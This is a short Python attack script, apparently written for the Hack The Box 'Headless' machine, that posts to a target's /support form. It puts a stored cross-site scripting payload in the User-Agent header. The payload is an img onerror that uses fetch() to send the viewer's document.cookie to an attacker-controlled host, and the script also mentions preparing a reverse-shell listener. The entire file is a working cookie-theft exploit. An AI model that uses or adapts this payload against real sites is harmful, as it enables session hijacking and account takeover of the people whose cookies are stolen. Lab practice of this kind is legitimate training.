from argparse import ArgumentParser
import requests
import time

parser = ArgumentParser('HTB Headless Script')

parser.add_argument('-ip', '--ip', type=str, required=True, help='Target IP')
parser.add_argument('-p', '--port', type=str, required=True, help='Target port')
parser.add_argument('-c', '--cookie', type=str, required=True, help='User cookie')
parser.add_argument('-host', '--host', type=str, required=True, help='Host IP')

args = parser.parse_args()

headers = {
    'User-Agent': "<img src=x onerror=fetch('http://" + args.host + "/'+document.cookie);>",
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://' + args.ip + ':' + args.port,
    'Referer': 'http://' + args.ip + ':' + args.port + '/support',
    'Cookie': 'is_admin=' + args.cookie,
    'Upgrade-Insecure-Requests': '1'
}

data = {
    'fname': 'time0ut',
    'lname': 'time0ut',
    'email': 'time0ut@gmail.com',
    'phone': '12345678',
    'message': '<>'
}

print('[*] ENSURE YOU HAVE A LISTENER ACTIVE IF YOU ARE ISSUING COMMANDS FOR REVERSE SHELL [*]\n')
print('[+] Initialized script')
print('[+] Sending payload')
time.sleep(1)
response = requests.post('http://' + args.ip + ':' + args.port + '/support', headers=headers, data=data)

print('[+] Payload sent')
